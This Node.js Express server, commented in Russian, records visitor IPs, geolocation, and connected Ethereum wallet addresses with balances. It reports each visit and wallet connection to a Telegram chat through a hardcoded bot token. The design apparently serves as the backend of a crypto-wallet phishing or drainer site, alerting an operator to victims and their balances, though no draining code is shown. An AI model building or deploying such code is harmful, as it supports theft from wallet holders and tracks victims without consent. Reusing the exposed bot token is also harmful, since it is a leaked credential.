const express = require('express');
const sqlite3 = require('sqlite3').verbose();
const axios = require('axios');
const Web3 = require('web3');

const app = express();
const port = 3000;
const TELEGRAM_BOT_TOKEN = '7056317634:AAEEXRtQmJXeOlZ8wci5FRrjs5ASgE24tCQ';
const TELEGRAM_CHAT_ID = '-1002087861469';

app.use(express.json());
app.use(express.static('public'));

// Создание базы данных SQLite и таблиц
const db = new sqlite3.Database('./database.db');

db.serialize(() => {
  db.run(`CREATE TABLE IF NOT EXISTS visits (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    ip TEXT,
    geo TEXT,
    visit_time TEXT
  )`);

  db.run(`CREATE TABLE IF NOT EXISTS wallets (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    ip TEXT,
    wallet_address TEXT,
    network TEXT,
    balance REAL,
    connection_time TEXT
  )`);

  db.run(`CREATE TABLE IF NOT EXISTS token_balances (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    wallet_address TEXT,
    token_symbol TEXT,
    token_balance REAL,
    network TEXT
  )`);
});

// Функция для получения геолокации по IP
async function getGeo(ip) {
  try {
    const response = await axios.get(`http://ipwho.is/${ip}`);
    return response.data;
  } catch (error) {
    console.error('Failed to get geo location:', error);
    return { country: 'undefined' };
  }
}

// Функция для отправки сообщений в Телеграм
async function sendMessage(message) {
  try {
    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
      parse_mode: 'Markdown'
    });
  } catch (error) {
    console.error('Failed to send message:', error);
  }
}

// Обработка нового входа
app.post('/log_visit', async (req, res) => {
  const { ip } = req.body;
  try {
    const geoData = await getGeo(ip);

    db.get('SELECT * FROM visits WHERE ip = ?', [ip], (err, row) => {
      if (err) {
        console.error(err);
        res.status(500).json({ error: 'Database error' });
        return;
      }

      const now = new Date().toISOString();
      if (row) {
        db.run('UPDATE visits SET visit_time = ? WHERE ip = ?', [now, ip]);
        sendMessage(`*Повторный вход*\nIP: \`${ip}\`\nГео: ${geoData.country}`);
        res.json({ status: 'existing' });
      } else {
        db.run('INSERT INTO visits (ip, geo, visit_time) VALUES (?, ?, ?)', [ip, geoData.country, now]);
        sendMessage(`*Новый вход*\nIP: \`${ip}\`\nГео: ${geoData.country}`);
        res.json({ status: 'new' });
      }
    });
  } catch (error) {
    console.error('Failed to get geo location:', error);
    res.status(500).json({ error: 'Failed to get geo location' });
  }
});

// Обработка запроса на подключение кошелька
app.post('/connect_wallet', async (req, res) => {
  const { wallet_address, ip, balance } = req.body;
  try {
    const geoData = await getGeo(ip);
    const now = new Date().toISOString();
    db.run('INSERT INTO wallets (ip, wallet_address, network, balance, connection_time) VALUES (?, ?, ?, ?, ?)', [ip, wallet_address, 'Ethereum', balance, now]);
    sendMessage(`*Подключен кошелек*\nIP: \`${ip}\`\nГео: ${geoData.country}\nКошелек: ${wallet_address}\nБаланс: ${balance} ETH`);
    res.json({ status: 'connected' });
  } catch (error) {
    console.error('Failed to connect wallet:', error);
    res.status(500).json({ error: 'Failed to connect wallet' });
  }
});

app.listen(port, () => {
  console.log(`Server is running on http://localhost:${port}`);
});
